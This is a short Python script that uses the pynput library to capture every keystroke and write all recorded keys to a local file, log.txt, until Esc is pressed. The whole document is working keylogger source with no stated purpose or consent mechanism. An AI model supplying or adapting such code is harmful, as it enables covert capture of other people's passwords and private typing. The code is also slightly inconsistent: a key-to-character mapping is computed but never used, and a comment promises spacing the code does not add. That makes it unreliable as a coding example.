import pynput
from pynput.keyboard import Key, Listener
   
keys = []
   
def on_press(key):
      
    keys.append(key)
    write_file(keys)

    if key == Key.tab:
        value = '\t'
    elif key == Key.enter:
        value = '\n'
    elif key == Key.space:
        value = ' '

           
def write_file(keys):
      
    with open('log.txt', 'w') as f:
        for key in keys:
              
            # removing ''
            k = str(key).replace("'", "")
            f.write(k)
                      
            # explicitly adding a space after 
            # every keystroke for readability
            f.write('') 
               
def on_release(key):

    if key == Key.esc:
        # Stop listener
        exit()
   
   
with Listener(on_press = on_press,
              on_release = on_release) as listener:
                      
    listener.join()